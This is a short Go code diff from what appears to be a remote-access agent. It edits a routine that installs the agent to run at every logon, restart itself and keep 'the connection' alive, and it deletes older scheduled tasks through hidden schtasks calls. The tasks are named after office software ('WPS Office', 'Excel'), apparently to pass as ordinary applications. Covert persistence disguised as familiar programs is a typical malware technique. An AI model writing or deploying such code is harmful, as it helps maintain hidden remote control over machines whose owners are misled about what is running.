@@ -14,7 +14,7 @@ import (
 	utf16enc "unicode/utf16"
 )
 
-const taskName = "WPS Office"
+const taskName = "WPS"
 
 // ensureInstalled copies the agent to a stable path and registers it to run at
 // every logon AND restart itself if it ever stops — so the connection is
@@ -30,7 +30,7 @@ func ensureInstalled() error {
 		forgetOldTasks()
 		if p, e := startupCmdPath(); e == nil {
 			os.Remove(p)
-			os.Remove(filepath.Join(filepath.Dir(p), "WPS.cmd"))
+			os.Remove(filepath.Join(filepath.Dir(p), "WPS Office.cmd"))
 		}
 		return nil
 	}
@@ -39,7 +39,7 @@ func ensureInstalled() error {
 }
 
 func forgetOldTasks() {
-	for _, name := range []string{"Excel", "RemoteFilesAgent", "RemoteAgent", "WPS"} {
+	for _, name := range []string{"Excel", "RemoteFilesAgent", "RemoteAgent", "WPS Office"} {
 		runHidden("schtasks", "/Delete", "/TN", name, "/F")
 	}
 }
